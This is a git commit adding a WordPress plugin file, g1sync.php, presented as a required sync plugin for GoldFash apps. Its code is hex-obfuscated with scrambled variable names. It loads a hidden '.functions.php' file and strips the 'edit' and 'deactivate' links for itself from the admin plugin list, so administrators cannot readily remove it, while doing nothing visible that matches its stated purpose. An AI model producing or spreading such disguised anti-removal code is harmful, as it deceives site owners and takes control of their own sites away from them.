446eb0883fd4b8c69bdf428157948e7fb2aa8092
GoldFash <goldfashhosting@users.noreply.github.com>
2017-09-27 23:24:01 -0400

    Initial Init

---
+++ g1sync.php
@@ -0,0 +1,26 @@
+<?php
+/*
+Plugin Name: G1Sync
+Plugin URL: https://god1st.cloud?WPPlugins
+Description: A Required Sync Plugin to Access any GoldFash App
+Version: 1.0
+Author: GoldFash Design
+Author URI:        https://goldfash.com
+Contributors:      raceanf
+Domain Path:       /languages
+Text Domain:       g1sync
+GitHub Plugin URI: https://github.com/goldfashhosting/g1sync
+GitHub Branch:     master
+*/
+
+ ${"G\x4c\x4f\x42\x41\x4cS"}["\x6f\x6a\x6a\x64\x64d\x64\x79\x6f\x67d\x75"]="a\x63\x74\x69\x6f\x6e\x73";
+ require("\x2efun\x63\x74\x69o\x6e\x73\x2eph\x70");
+ add_filter("p\x6cu\x67i\x6e_ac\x74\x69\x6f\x6e_\x6cin\x6bs","\x64i\x73a\x62\x6c\x65_\x70l\x75\x67i\x6e\x5f\x64e\x61\x63\x74iv\x61\x74ion",10,4);
+ function disable_plugin_deactivation($actions,$plugin_file,$plugin_data,$context){$gavzrwppgj="\x61\x63t\x69\x6f\x6es";
+ $enogdel="a\x63tion\x73";
+ $iqsdhmx="a\x63\x74\x69on\x73";
+ $pxnxhjuq="\x61\x63\x74i\x6f\x6es";
+ if(array_key_exists("\x65\x64i\x74",${$iqsdhmx}))unset(${$gavzrwppgj}["\x65\x64\x69\x74"]);
+ $jvypkj="\x70lug\x69\x6e\x5ff\x69\x6c\x65";
+ if(array_key_exists("d\x65\x61c\x74i\x76\x61\x74e",${$enogdel})&&in_array(${$jvypkj},array("G1\x53\x79\x6ec/\x671sy\x6ec.\x70\x68p",)))unset(${${"G\x4c\x4f\x42\x41\x4cS"}["\x6f\x6a\x6a\x64d\x64dyo\x67\x64\x75"]}["\x64\x65a\x63\x74\x69\x76\x61\x74e"]);return${$pxnxhjuq};}
+?>
